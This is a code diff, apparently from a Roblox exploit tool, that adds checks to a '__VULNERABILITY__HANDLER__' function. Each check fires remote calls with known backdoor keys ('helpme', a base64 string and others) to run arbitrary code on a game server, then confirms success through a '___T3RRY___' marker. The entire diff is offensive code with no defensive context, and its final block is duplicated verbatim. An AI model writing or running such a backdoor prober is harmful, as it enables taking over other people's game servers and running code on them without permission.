@@ -105,4 +105,39 @@ function __VULNERABILITY__HANDLER__(v: Instance)
       return v, "BACKDOOR"
     end
   end
+	do
+    __REMOTE__RUNNER__(v, unpack({[1]="5#lGIERKWEF"}), CODE)
+    task.wait()
+    if REPLICATED_STORAGE["___T3RRY___"] then
+      return v, "RUN"
+    end
+  end
+  do
+    __REMOTE__RUNNER__(v, unpack({[1]="pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2]=",,,,,,,,,,,,,,," }), CODE)
+    task.wait()
+    if REPLICATED_STORAGE["___T3RRY___"] then
+      return v, "EMMA"
+    end
+  end
+  do
+    __REMOTE__RUNNER__(v, unpack({[1]="helpme"}), CODE)
+    task.wait()
+    if REPLICATED_STORAGE["___T3RRY___"] then
+      return v, "HELPME"
+    end
+  end
+  do
+    __REMOTE__RUNNER__(v, {[1]="cGlja2V0dA=="}, CODE)
+    task.wait()
+    if REPLICATED_STORAGE["___T3RRY___"] then
+      return v, "PICKETT"
+    end
+  end
+  do
+    __REMOTE__RUNNER__(v, {[1]="cGlja2V0dA=="}, CODE)
+    task.wait()
+    if REPLICATED_STORAGE["___T3RRY___"] then
+      return v, "PICKETT"
+    end
+  end
 end
